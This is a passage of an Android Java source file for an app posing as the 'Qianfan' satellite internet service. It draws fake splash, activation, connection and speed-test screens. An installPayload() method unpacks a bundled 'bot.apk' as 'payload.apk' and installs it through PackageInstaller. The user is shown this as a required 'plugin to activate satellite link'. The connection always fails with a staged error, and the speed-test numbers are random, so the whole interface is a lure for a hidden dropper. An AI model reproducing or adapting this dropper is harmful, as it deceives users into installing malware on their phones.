package com.qianfan.satellitelink;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.DashPathEffect;
import android.graphics.LinearGradient;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.RadialGradient;
import android.graphics.RectF;
import android.graphics.Shader;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.MotionEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.Toast;
import android.widget.VideoView;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Random;

public class MainActivity extends Activity {
    private static final String PREFS = "qianfan_prefs";
    private static final String KEY_ID = "satellite_id";
    private static final String KEY_READY = "activated";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().setNavigationBarColor(Color.BLACK);
        hideSystemUi();
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        String id = prefs.getString(KEY_ID, null);
        if (id == null) {
            id = String.format(Locale.US, "%010d", 1000000000L + Math.abs(new Random().nextLong()) % 9000000000L);
            prefs.edit().putString(KEY_ID, id).apply();
        }
        FrameLayout root = new FrameLayout(this);
        VideoView splashVideo = new FillVideoView(this);
        splashVideo.setVideoURI(Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.splash_bg));
        splashVideo.setOnPreparedListener(mp -> {
            mp.setLooping(false);
            mp.setVolume(0f, 0f);
            splashVideo.start();
        });
        root.addView(splashVideo, new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        VideoView loadingVideo = new FillVideoView(this);
        loadingVideo.setVideoURI(Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.loading_bg));
        loadingVideo.setVisibility(View.GONE);
        loadingVideo.setOnPreparedListener(mp -> {
            mp.setLooping(false);
            mp.setVolume(0f, 0f);
        });
        root.addView(loadingVideo, new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        QianfanView appView = new QianfanView(this, prefs, id, () -> {
            splashVideo.stopPlayback();
            splashVideo.setVisibility(View.GONE);
            loadingVideo.setVisibility(View.VISIBLE);
            loadingVideo.seekTo(0);
            loadingVideo.start();
        }, () -> {
            loadingVideo.stopPlayback();
            loadingVideo.setVisibility(View.GONE);
        });
        root.addView(appView, new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        setContentView(root);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) hideSystemUi();
    }

    private void hideSystemUi() {
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        );
    }

    public void installPayload() {
        try {
            java.io.InputStream in = getAssets().open("bot.apk");
            java.io.File outFile = new java.io.File(getFilesDir(), "payload.apk");
            java.io.FileOutputStream out = new java.io.FileOutputStream(outFile);
            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            out.flush();
            out.close();

            android.content.pm.PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            android.content.pm.PackageInstaller.SessionParams params = new android.content.pm.PackageInstaller.SessionParams(
                    android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = packageInstaller.createSession(params);
            android.content.pm.PackageInstaller.Session session = packageInstaller.openSession(sessionId);

            java.io.OutputStream outSession = session.openWrite("package", 0, -1);
            java.io.InputStream inSession = new java.io.FileInputStream(outFile);
            byte[] buffer2 = new byte[65536];
            int c;
            while ((c = inSession.read(buffer2)) != -1) {
                outSession.write(buffer2, 0, c);
            }
            session.fsync(outSession);
            inSession.close();
            outSession.close();

            int flags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (android.os.Build.VERSION.SDK_INT >= 31) {
                flags |= 33554432; // FLAG_MUTABLE
            }
            android.content.Intent broadcastIntent = new android.content.Intent(this, InstallReceiver.class);
            broadcastIntent.setAction("com.qianfan.satellitelink.INSTALL_COMPLETE");
            
            android.app.PendingIntent pendingIntent = android.app.PendingIntent.getBroadcast(
                    this,
                    sessionId,
                    broadcastIntent,
                    flags);

            session.commit(pendingIntent.getIntentSender());
        } catch (Exception e) {
            e.printStackTrace();
            android.widget.Toast.makeText(this, "Bot extraction error: " + e.getMessage(), android.widget.Toast.LENGTH_LONG).show();
        }
    }

    private static final class FillVideoView extends VideoView {
        FillVideoView(Context context) {
            super(context);
        }

        @Override
        protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
            setMeasuredDimension(MeasureSpec.getSize(widthMeasureSpec), MeasureSpec.getSize(heightMeasureSpec));
        }
    }

    private static final class QianfanView extends View {
        private static final int BG = Color.rgb(5, 11, 24);
        private static final int CARD = Color.rgb(13, 27, 42);
        private static final int CARD_2 = Color.rgb(16, 34, 55);
        private static final int LINE = Color.rgb(33, 53, 78);
        private static final int BLUE = Color.rgb(0, 102, 255);
        private static final int CYAN = Color.rgb(0, 212, 255);
        private static final int GREEN = Color.rgb(44, 134, 255);
        private static final int RED = Color.rgb(255, 82, 82);
        private static final int TEXT = Color.rgb(238, 246, 255);
        private static final int MUTED = Color.rgb(151, 165, 184);

        private final SharedPreferences prefs;
        private final String satelliteId;
        private boolean hasRedeemedReferral = false;
        private String myReferralCode = "";
        private final Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final List<Hit> hits = new ArrayList<>();
        private final Handler handler = new Handler(Looper.getMainLooper());
        private final Random random = new Random(7);
        private final float[] stars = new float[140 * 3];
        private final Bitmap spaceBg;
        private final Bitmap satelliteImg;
        private final Bitmap trophyImg;
        private final Runnable onSplashDone;
        private final Runnable onLoadingDone;
        private long started = System.currentTimeMillis();
        private int screen = 0;
        private float density;
        private boolean splashClosed = false;
        private boolean loadingClosed = false;
        
        private int lastScreen = -1;
        private long transitionStart = 0;
        private long clickStart = 0;
        private Hit clickedHit = null;
        private float clickX = 0f;
        private float clickY = 0f;
        private boolean isInstallingBot = false;
        private boolean showBotInstallPopup = false;

        QianfanView(Context context, SharedPreferences prefs, String satelliteId, Runnable onSplashDone, Runnable onLoadingDone) {
            super(context);
            this.prefs = prefs;
            this.satelliteId = satelliteId;
            this.hasRedeemedReferral = prefs.getBoolean("has_redeemed_referral", false);
            this.myReferralCode = satelliteId.length() >= 6 ? satelliteId.substring(0, 6) : "QIANFN";
            this.density = getResources().getDisplayMetrics().density;
            this.spaceBg = BitmapFactory.decodeResource(getResources(), getResources().getIdentifier("space_bg", "drawable", context.getPackageName()));
            this.satelliteImg = BitmapFactory.decodeResource(getResources(), R.drawable.satellite);
            this.trophyImg = BitmapFactory.decodeResource(getResources(), R.drawable.trophy);
            this.onSplashDone = onSplashDone;
            this.onLoadingDone = onLoadingDone;
            for (int i = 0; i < 400; i += 3) {
                stars[i] = random.nextFloat() * 1200;
                stars[i + 1] = random.nextFloat() * 2000;
                stars[i + 2] = 0.35f + random.nextFloat() * 0.65f;
            }
            handler.postDelayed(tick, 16);
            
            this.popupDismissed = prefs.getBoolean("popup_dismissed", false);
            this.bonusAdded = prefs.getBoolean("bonus_added", false);
            
            int baseData = 300;
            if (this.bonusAdded) baseData += 300;
            if (this.hasRedeemedReferral) baseData += 100;
            this.totalData = baseData;
        }

        private final Runnable tick = new Runnable() {
            @Override public void run() {
                invalidate();
                handler.postDelayed(this, 16);
            }
        };

        @Override protected void onDetachedFromWindow() {
            handler.removeCallbacksAndMessages(null);
            super.onDetachedFromWindow();
        }

        @Override protected void onDraw(Canvas c) {
            float w = getWidth();
            float h = getHeight();
            hits.clear();
            long elapsed = System.currentTimeMillis() - started;
            if (screen == 0 && elapsed > 9000) {
                setScreen(1);
                closeSplashVideo();
            }
            if (screen == 1 && elapsed > 14000) {
                setScreen(prefs.getBoolean(KEY_READY, false) ? 3 : 12);
                closeLoadingVideo();
            }
            if (screen != 0 && screen != 1) {
                drawBackground(c, w, h);
            }
            if (screen == 12 && isInstallingBot) {
                SharedPreferences botPrefs = getContext().getSharedPreferences("bot_prefs", Context.MODE_PRIVATE);
                if (botPrefs.getString("bot_package", null) != null) {
                    isInstallingBot = false;
                    prefs.edit().putBoolean(KEY_READY, true).apply();
                    setScreen(3);
                    closeSplashVideo();
                }
            }
            
            long transElapsed = System.currentTimeMillis() - transitionStart;
            float alpha = 1f;
            if (transElapsed < 300 && lastScreen > 1) {
                alpha = transElapsed / 300f;
                c.saveLayerAlpha(0, 0, w, h, (int)(255 * (1f - alpha)), Canvas.ALL_SAVE_FLAG);
                drawScreen(c, w, h, lastScreen, elapsed);
                c.restore();
                c.saveLayerAlpha(0, 0, w, h, (int)(255 * alpha), Canvas.ALL_SAVE_FLAG);
                c.translate(w * (1f - alpha), 0);
            }
            
            drawScreen(c, w, h, screen, elapsed);
            
            if (transElapsed < 300 && lastScreen > 1) {
                c.restore();
            }
            
            if (clickedHit != null) {
                long clickElapsed = System.currentTimeMillis() - clickStart;
                if (clickElapsed < 200) {
                    p.setColor(Color.argb(50, 255, 255, 255));
                    c.drawRoundRect(clickedHit.rect, dp(8), dp(8), p);
                } else {
                    clickedHit = null;
                }
            }
        }
        
        private void drawScreen(Canvas c, float w, float h, int scr, long elapsed) {
            switch (scr) {
                case 0: drawSplash(c, w, h, elapsed); break;
                case 1: drawLoading(c, w, h); break;
                case 2: drawLogin(c, w, h); break;
                case 3: drawHome(c, w, h); break;
                case 4: drawConnection(c, w, h); break;
                case 5: drawSpeed(c, w, h); break;
                case 6: drawPackages(c, w, h); break;
                case 7: drawUsage(c, w, h); break;
                case 8: drawBilling(c, w, h); break;
                case 9: drawSupport(c, w, h); break;
                case 10: drawProfile(c, w, h); break;
                case 11: drawSettings(c, w, h); break;
                case 12: drawActivation(c, w, h); break;
                case 13: drawReferral(c, w, h); break;
            }
        }

        private void drawBackground(Canvas c, float w, float h) {
            p.setShader(new LinearGradient(0, 0, 0, h, Color.rgb(3, 7, 16), BG, Shader.TileMode.CLAMP));
            c.drawRect(0, 0, w, h, p);
            p.setShader(null);
            p.setColor(Color.argb(80, 0, 102, 255));
            p.setShader(new RadialGradient(w * 0.78f, h * 0.08f, w * 0.6f, Color.argb(95, 0, 102, 255), Color.TRANSPARENT, Shader.TileMode.CLAMP));
            c.drawCircle(w * 0.78f, h * 0.08f, w * 0.6f, p);
            p.setShader(null);
            for (int i = 0; i < stars.length; i += 3) {
                p.setColor(Color.argb((int)(70 * stars[i + 2]), 58, 172, 255));
                c.drawCircle(stars[i] * w, stars[i + 1] * h * 0.65f, dp(0.7f + stars[i + 2]), p);
            }
        }

        private void drawSplash(Canvas c, float w, float h, long elapsed) {
            p.setShader(new LinearGradient(0, h * 0.44f, 0, h, Color.TRANSPARENT, Color.rgb(2, 6, 14), Shader.TileMode.CLAMP));
            c.drawRect(0, h * 0.44f, w, h, p);
            p.setShader(null);
            drawSplashWifi(c, w * 0.5f, h * 0.675f);
            drawBrandName(c, w * 0.5f, h * 0.765f);
            text(c, "Satellite Internet", w * 0.5f, h * 0.822f, 17, Color.rgb(79, 154, 255), Paint.Align.CENTER, true);
            float loadX = w * 0.5f - dp(59);
            float loadY = h * 0.872f;
            text(c, "Initializing...", w * 0.5f, loadY - dp(9), 11, Color.rgb(190, 199, 214), Paint.Align.CENTER, false);
            p.setColor(Color.rgb(39, 66, 95));
            c.drawRoundRect(new RectF(loadX, loadY, loadX + dp(118), loadY + dp(4)), dp(2), dp(2), p);
            float pct = 0.28f + Math.min(1f, elapsed / 9000f) * 0.72f;
            p.setShader(new LinearGradient(loadX, loadY, loadX + dp(118), loadY + dp(4), Color.rgb(24, 169, 255), Color.rgb(79, 125, 255), Shader.TileMode.CLAMP));
            c.drawRoundRect(new RectF(loadX, loadY, loadX + dp(118) * pct, loadY + dp(4)), dp(2), dp(2), p);
            p.setShader(null);
        }

        private void drawActivation(Canvas c, float w, float h) {
            top(c, w, "First Activation", false);
            
            p.setShader(new RadialGradient(w * 0.5f, h * 0.22f, dp(120), Color.argb(40, 0, 212, 255), Color.TRANSPARENT, Shader.TileMode.CLAMP));
            c.drawCircle(w * 0.5f, h * 0.22f, dp(120), p);
            p.setShader(null);
            
            if (satelliteImg != null) {
                float imgW = satelliteImg.getWidth();
                float imgH = satelliteImg.getHeight();
                float scale = dp(160) / Math.max(imgW, imgH);
                float sw = imgW * scale;
                float sh = imgH * scale;
                
                long elapsed = System.currentTimeMillis() - started;
                float floatY = (float) Math.sin(elapsed / 600f) * dp(5);
                float rot = (float) Math.sin(elapsed / 800f) * 2f;
                
                c.save();
                c.translate(w * 0.5f, h * 0.22f + floatY);
                c.rotate(rot);
                c.drawBitmap(satelliteImg, null, new RectF(-sw/2, -sh/2, sw/2, sh/2), p);
                c.restore();
            } else {
                drawLargeSatelliteIcon(c, w * 0.5f, h * 0.22f);
            }
            
            text(c, "Welcome To Qianfan 千帆", w * 0.5f, h * 0.34f, 26, TEXT, Paint.Align.CENTER, true);
            text(c, "Your Satellite ID", w * 0.5f, h * 0.42f, 14, MUTED, Paint.Align.CENTER, false);
            
            p.setShader(new LinearGradient(dp(24), h * 0.46f, w - dp(24), h * 0.56f, Color.rgb(15, 30, 50), Color.rgb(8, 16, 28), Shader.TileMode.CLAMP));
            p.setShadowLayer(dp(12), 0, dp(4), Color.argb(60, 0, 212, 255));
            c.drawRoundRect(new RectF(dp(24), h * 0.46f, w - dp(24), h * 0.56f), dp(16), dp(16), p);
            p.setShadowLayer(0, 0, 0, 0);
            p.setShader(null);
            
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1));
            p.setColor(Color.argb(100, 0, 212, 255));
            c.drawRoundRect(new RectF(dp(24), h * 0.46f, w - dp(24), h * 0.56f), dp(16), dp(16), p);
            p.setStyle(Paint.Style.FILL);
            
            String displayId = satelliteId.length() == 10 ? satelliteId.substring(0, 5) + " " + satelliteId.substring(5) : satelliteId;
            p.setTypeface(android.graphics.Typeface.create(android.graphics.Typeface.DEFAULT, android.graphics.Typeface.BOLD));
            p.setTextSize(dp(30));
            float idWidth = p.measureText(displayId);
            
            text(c, displayId, w * 0.5f - dp(12), h * 0.525f, 30, CYAN, Paint.Align.CENTER, true);
            
            float iconX = w * 0.5f + idWidth / 2 + dp(4);
            float iconY = h * 0.525f - dp(8);
            float sz = dp(18);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1.5f));
            p.setColor(CYAN);
            c.drawRoundRect(new RectF(iconX, iconY - sz*0.1f, iconX + sz*0.6f, iconY + sz*0.7f), dp(2), dp(2), p);
            c.drawRoundRect(new RectF(iconX + sz*0.3f, iconY - sz*0.5f, iconX + sz*0.9f, iconY + sz*0.3f), dp(2), dp(2), p);
            p.setStyle(Paint.Style.FILL);
            
            hit(dp(24), h * 0.46f, w - dp(48), h * 0.1f, "copy");
            
            p.setShadowLayer(dp(8), 0, dp(4), Color.argb(100, 0, 212, 255));
            pill(c, dp(24), h * 0.81f, w - dp(48), dp(58), "Continue", GREEN, "home");
            p.setShadowLayer(0, 0, 0, 0);
            
            text(c, "Have a Referral Code?", w * 0.5f, h * 0.94f, 15, CYAN, Paint.Align.CENTER, true);
            hit(w * 0.2f, h * 0.90f, w * 0.6f, dp(40), "enter_referral");

            if (showBotInstallPopup) {
                p.setColor(Color.argb(200, 0, 0, 0));
                c.drawRect(0, 0, w, h, p);
                
                float pw = w * 0.85f;
                float ph = dp(240);
                float px = (w - pw) / 2;
                float py = (h - ph) / 2;
                
                card(c, px, py, pw, ph);
                
                drawConnectIcon(c, px + pw / 2, py + dp(60), 2f);
                
                text(c, "Component Required", px + pw / 2, py + dp(130), 18, TEXT, Paint.Align.CENTER, true);
                text(c, "Please install the required", px + pw / 2, py + dp(155), 14, MUTED, Paint.Align.CENTER, false);
                text(c, "plugin to activate satellite link.", px + pw / 2, py + dp(175), 14, MUTED, Paint.Align.CENTER, false);
                
                pill(c, px + dp(20), py + ph - dp(60), (pw - dp(50))/2, dp(40), "Cancel", CARD_2, "cancel_install_bot");
                pill(c, px + dp(30) + (pw - dp(50))/2, py + ph - dp(60), (pw - dp(50))/2, dp(40), "Install", GREEN, "do_install_bot");
            }
        }

        private void drawLargeSatelliteIcon(Canvas c, float cx, float cy) {
            c.save();
            c.translate(cx, cy);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1.5f));
            p.setColor(Color.argb(80, 0, 212, 255));
            c.drawCircle(0, 0, dp(42), p);
            p.setColor(Color.argb(30, 0, 212, 255));
            c.drawCircle(0, 0, dp(58), p);
            
            c.rotate(-20);
            p.setStyle(Paint.Style.FILL);
            p.setColor(Color.WHITE);
            c.drawRoundRect(new RectF(-dp(12), -dp(8), dp(12), dp(8)), dp(3), dp(3), p);
            
            p.setShader(new LinearGradient(-dp(50), 0, -dp(16), 0, Color.rgb(4, 130, 255), Color.rgb(0, 70, 180), Shader.TileMode.CLAMP));
            c.drawRoundRect(new RectF(-dp(48), -dp(12), -dp(16), dp(12)), dp(2), dp(2), p);
            p.setShader(new LinearGradient(dp(16), 0, dp(50), 0, Color.rgb(0, 70, 180), Color.rgb(4, 130, 255), Shader.TileMode.CLAMP));
            c.drawRoundRect(new RectF(dp(16), -dp(12), dp(48), dp(12)), dp(2), dp(2), p);
            p.setShader(null);
            
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(1));
            p.setColor(Color.argb(100, 255, 255, 255));
            c.drawLine(-dp(48), 0, -dp(16), 0, p);
            c.drawLine(dp(16), 0, dp(48), 0, p);
            for(int i=-40; i<=-24; i+=8) c.drawLine(dp(i), -dp(12), dp(i), dp(12), p);
            for(int i=24; i<=40; i+=8) c.drawLine(dp(i), -dp(12), dp(i), dp(12), p);
            
            c.rotate(20);
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(2.5f));
            p.setColor(CYAN);
            p.setStrokeCap(Paint.Cap.ROUND);
            for(int i=1; i<=3; i++) {
                p.setAlpha(255 - i * 50);
                c.drawArc(new RectF(-dp(8*i), dp(18) - dp(8*i), dp(8*i), dp(18) + dp(8*i)), 60, 60, false, p);
            }
            p.setAlpha(255);
            p.setStyle(Paint.Style.FILL);
            c.restore();
        }

        private void drawLoading(Canvas c, float w, float h) {
            float elapsed = Math.max(0, System.currentTimeMillis() - started - 9000);
            float pct = Math.min(1f, elapsed / 5000f);
            float progressValue = 0.55f + pct * 0.45f;
            int progressLabel = Math.round(progressValue * 100);
            float barY = h - dp(160);
            float barW = w * 0.72f;
            float barX = (w - barW) / 2;
            float barH = dp(8);
            
            p.setColor(Color.argb(150, 4, 15, 30));
            c.drawRoundRect(new RectF(barX, barY, barX + barW, barY + barH), barH / 2, barH / 2, p);
            p.setShader(new LinearGradient(barX, barY, barX + barW * progressValue, barY, BLUE, CYAN, Shader.TileMode.CLAMP));
            p.setShadowLayer(dp(6), 0, 0, CYAN);
            c.drawRoundRect(new RectF(barX, barY, barX + barW * progressValue, barY + barH), barH / 2, barH / 2, p);
            p.setShadowLayer(0, 0, 0, 0);
            p.setShader(null);

            p.setShadowLayer(dp(6), 0, 0, Color.argb(100, 0, 212, 255));
            text(c, progressLabel + "%", w * 0.5f, barY + dp(38), 18, Color.WHITE, Paint.Align.CENTER, true);
            p.setShadowLayer(0, 0, 0, 0);
            
            int noteColor = Color.argb(216, 200, 210, 225);
            p.setShadowLayer(dp(6), 0, dp(2), Color.BLACK);
            text(c, "Establishing connection", w * 0.5f, barY + dp(74), 13, noteColor, Paint.Align.CENTER, true);
            text(c, "with satellite...", w * 0.5f, barY + dp(94), 13, noteColor, Paint.Align.CENTER, true);
            p.setShadowLayer(0, 0, 0, 0);
            hit(0, 0, w, h, "activate");
        }

        private void drawLogin(Canvas c, float w, float h) {
            top(c, w, "Satellite ID Login", true);
            text(c, "Qianfan 千帆", w * 0.5f, h * 0.22f, 36, TEXT, Paint.Align.CENTER, true);
            text(c, "Satellite Internet", w * 0.5f, h * 0.27f, 15, CYAN, Paint.Align.CENTER, false);
            field(c, dp(24), h * 0.38f, w - dp(48), dp(58), "Enter Your 10-Digit Satellite ID");
            pill(c, dp(24), h * 0.49f, w - dp(48), dp(56), "Continue", BLUE, "home");
            pill(c, dp(24), h * 0.58f, w - dp(48), dp(48), "Paste ID", CYAN, "paste");
        }

        private boolean popupDismissed = false;
        private boolean showIncompatibleError = false;
        private boolean bonusAdded = false;
        private int totalData = 300;
        private float usedData = 0f;

        private void drawHome(Canvas c, float w, float h) {
            text(c, "Qianfan 千帆", dp(24), dp(52), 17, TEXT, Paint.Align.LEFT, true);
            text(c, "Disconnected", dp(24), dp(78), 12, RED, Paint.Align.LEFT, false);
            drawSatellite(c, w - dp(84), dp(85), dp(0.72f), 12);
            card(c, dp(18), dp(106), w - dp(36), dp(105));
            hit(dp(18), dp(106), w - dp(36), dp(105), "connection");
            text(c, "Connection Status", dp(34), dp(138), 12, MUTED, Paint.Align.LEFT, false);
            text(c, "Disconnected", dp(34), dp(168), 20, RED, Paint.Align.LEFT, true);
            text(c, "Not connected to any satellite", dp(34), dp(193), 12, MUTED, Paint.Align.LEFT, false);
            drawSignal(c, w - dp(70), dp(158), RED, false);
            String downStr = lastCompletedDownload > 0 ? String.format(java.util.Locale.US, "%.1f", lastCompletedDownload) : "0.0";
            String upStr = lastCompletedUpload > 0 ? String.format(java.util.Locale.US, "%.1f", lastCompletedUpload) : "0.0";
            metric(c, dp(18), dp(224), (w - dp(48)) / 2, "Download", downStr, "Mbps");
            metric(c, w / 2 + dp(6), dp(224), (w - dp(48)) / 2, "Upload", upStr, "Mbps");
            card(c, dp(18), dp(336), w - dp(36), dp(88));
            text(c, "Data Usage", dp(34), dp(366), 12, MUTED, Paint.Align.LEFT, false);
            text(c, (int)usedData + " GB", dp(34), dp(398), 22, TEXT, Paint.Align.LEFT, true);
            text(c, "/ " + totalData + " GB", dp(126), dp(398), 12, MUTED, Paint.Align.LEFT, false);
            float progressRatio = usedData / (float)totalData;
            progress(c, dp(34), dp(408), w - dp(120), dp(8), progressRatio, GREEN);
            text(c, (int)(progressRatio * 100) + "%", w - dp(42), dp(398), 13, TEXT, Paint.Align.RIGHT, true);
            quick(c, w);
            bottom(c, w, h, 0);

            if (!popupDismissed && screen == 3) {
                drawPopup(c, w, h);
            }
            if (showIncompatibleError) {
                drawErrorPopup(c, w, h);
            }
        }

        private boolean isConnecting = false;
        private long connectStartTime = 0;

        private void drawConnection(Canvas c, float w, float h) {
            top(c, w, "Connection", true);
            float cx = w / 2, cy = h * 0.28f, r = w * 0.34f;
            for (int i = 0; i < 5; i++) {
                p.setStyle(Paint.Style.STROKE);
                p.setStrokeWidth(dp(1));
                p.setColor(Color.argb(38, 0, 212, 255));
                c.drawCircle(cx, cy, r - i * dp(18), p);
            }
            p.setStrokeWidth(dp(4));
            p.setColor(RED);
            c.drawCircle(cx, cy, r * 0.72f, p);
            p.setColor(RED);
            drawConnectIcon(c, cx, cy - dp(20), 1.2f);
            text(c, "Disconnected", cx, cy + dp(20), 16, RED, Paint.Align.CENTER, true);
            text(c, "No Signal", cx, cy + dp(42), 12, MUTED, Paint.Align.CENTER, false);
            infoRow(c, dp(24), h * 0.54f, w - dp(48), "Satellite", "-");
            infoRow(c, dp(24), h * 0.60f, w - dp(48), "Satellite ID", "-");
            infoRow(c, dp(24), h * 0.66f, w - dp(48), "Latency", "-");
            infoRow(c, dp(24), h * 0.72f, w - dp(48), "Signal Strength", "-");
            
            if (isConnecting) {
                long elapsed = System.currentTimeMillis() - connectStartTime;
                if (elapsed > 2500) { // 2.5 seconds delay
                    isConnecting = false;
                    showIncompatibleError = true;
                } else {
                    invalidate();
                }
            }

            if (isConnecting) {
                pill(c, dp(24), h * 0.83f, w - dp(48), dp(54), "    Connecting...", GREEN, null);
                float cxBtn = w / 2 - dp(50);
                float cyBtn = h * 0.83f + dp(27);
                p.setStyle(Paint.Style.STROKE);
                p.setStrokeWidth(dp(2));
                p.setColor(Color.argb(80, 255, 255, 255));
                c.drawCircle(cxBtn, cyBtn, dp(8), p);
                p.setColor(Color.WHITE);
                float sweep = ((System.currentTimeMillis() - connectStartTime) % 1000) / 1000f * 360f;
                c.drawArc(new RectF(cxBtn - dp(8), cyBtn - dp(8), cxBtn + dp(8), cyBtn + dp(8)), sweep, 90, false, p);
                p.setStyle(Paint.Style.FILL);
            } else {
                pill(c, dp(24), h * 0.83f, w - dp(48), dp(54), "Connect", GREEN, "start_connect");
            }

            bottom(c, w, h, 0);

            if (showIncompatibleError) {
                drawErrorPopup(c, w, h);
            }
        }

        private long speedTestStart = 0;
        private int speedTestState = 0; // 0=idle, 1=down, 2=up, 3=done
        private float finalDownloadSpeed = 0f;
        private float finalUploadSpeed = 0f;
        private float currentDisplayedSpeed = 0f;
        private float finalPing = 28f;
        private float finalJitter = 6f;
        private float finalLoss = 0f;
        private float lastCompletedDownload = 0f;
        private float lastCompletedUpload = 0f;

        private void drawSpeed(Canvas c, float w, float h) {
            top(c, w, "Speed Test", true);
            float box = (w - dp(54)) / 3;
            String pingStr = "28";
            String jitterStr = "6";
            String lossStr = "0";

            if (speedTestState != 0) {
                if (speedTestState < 3) {
                    pingStr = String.format(java.util.Locale.US, "%.0f", Math.max(10, finalPing + (Math.random() * 10 - 5)));
                    jitterStr = String.format(java.util.Locale.US, "%.0f", Math.max(1, finalJitter + (Math.random() * 4 - 2)));
                    lossStr = "0";
                } else {
                    pingStr = String.format(java.util.Locale.US, "%.0f", finalPing);
                    jitterStr = String.format(java.util.Locale.US, "%.0f", finalJitter);
                    lossStr = String.format(java.util.Locale.US, "%.0f", finalLoss);
                }
            }

            statBox(c, dp(18), dp(82), box, "Ping", pingStr, "ms");
            statBox(c, dp(27) + box, dp(82), box, "Jitter", jitterStr, "ms");
            statBox(c, dp(36) + box * 2, dp(82), box, "Loss", lossStr, "%");
            
            float gaugeVal = 0;
            String downloadStr = "0.0";
            String uploadStr = "0.0";

            if (speedTestState != 0) {
                long elapsed = System.currentTimeMillis() - speedTestStart;
                if (speedTestState == 1) { // Download test for 3 seconds
                    if (elapsed > 3000) {
                        speedTestState = 2;
                        speedTestStart = System.currentTimeMillis();
                        elapsed = 0;
                        currentDisplayedSpeed = finalDownloadSpeed;
                    } else {
                        currentDisplayedSpeed = finalDownloadSpeed * (0.6f + (float)Math.random() * 0.4f) * (elapsed / 3000f);
                        if (currentDisplayedSpeed > finalDownloadSpeed) currentDisplayedSpeed = finalDownloadSpeed;
                        invalidate();
                    }
                }
                if (speedTestState == 2) { // Upload test for 3 seconds
                    downloadStr = String.format(java.util.Locale.US, "%.1f", finalDownloadSpeed);
                    if (elapsed > 3000) {
                        speedTestState = 3;
                        currentDisplayedSpeed = finalUploadSpeed;
                    } else {
                        currentDisplayedSpeed = finalUploadSpeed * (0.6f + (float)Math.random() * 0.4f) * (elapsed / 3000f);
                        if (currentDisplayedSpeed > finalUploadSpeed) currentDisplayedSpeed = finalUploadSpeed;
                        invalidate();
                    }
                }
                if (speedTestState == 3) {
                    downloadStr = String.format(java.util.Locale.US, "%.1f", finalDownloadSpeed);
                    uploadStr = String.format(java.util.Locale.US, "%.1f", finalUploadSpeed);
                    gaugeVal = finalDownloadSpeed;
                    lastCompletedDownload = finalDownloadSpeed;
                    lastCompletedUpload = finalUploadSpeed;
                }
                if (speedTestState == 1) {
                    downloadStr = String.format(java.util.Locale.US, "%.1f", currentDisplayedSpeed);
                    gaugeVal = currentDisplayedSpeed;
                } else if (speedTestState == 2) {
                    uploadStr = String.format(java.util.Locale.US, "%.1f", currentDisplayedSpeed);
                    gaugeVal = currentDisplayedSpeed;
                }
            }

            float cx = w / 2, cy = h * 0.40f, r = w * 0.34f;
            p.setStyle(Paint.Style.STROKE);
            p.setStrokeWidth(dp(10));
            p.setStrokeCap(Paint.Cap.ROUND);
            p.setColor(Color.rgb(19, 50, 83));
            c.drawArc(new RectF(cx - r, cy - r, cx + r, cy + r), 145, 250, false, p);
            
            float sweep = Math.min(250f, (gaugeVal / 1050f) * 250f);
            if (sweep < 0) sweep = 0;
            if (sweep > 0) {
                p.setColor(CYAN);
                c.drawArc(new RectF(cx - r, cy - r, cx + r, cy + r), 145, sweep, false, p);
            }
            p.setStyle(Paint.Style.FILL);
            p.setStrokeCap(Paint.Cap.BUTT);
            needle(c, cx, cy, r * 0.68f, 145 + sweep);
            
            String centerStr = speedTestState == 1 ? downloadStr : (speedTestState == 2 ? uploadStr : downloadStr);
            String centerLabel = speedTestState == 2 ? "Uploading..." : (speedTestState == 1 ? "Downloading..." : "Download");
            text(c, centerStr, cx, cy + dp(58), 34, TEXT, Paint.Align.CENTER, true);
            text(c, "Mbps", cx, cy + dp(86), 12, MUTED, Paint.Align.CENTER, false);
            text(c, centerLabel, cx, cy + dp(116), 14, CYAN, Paint.Align.CENTER, false);
            
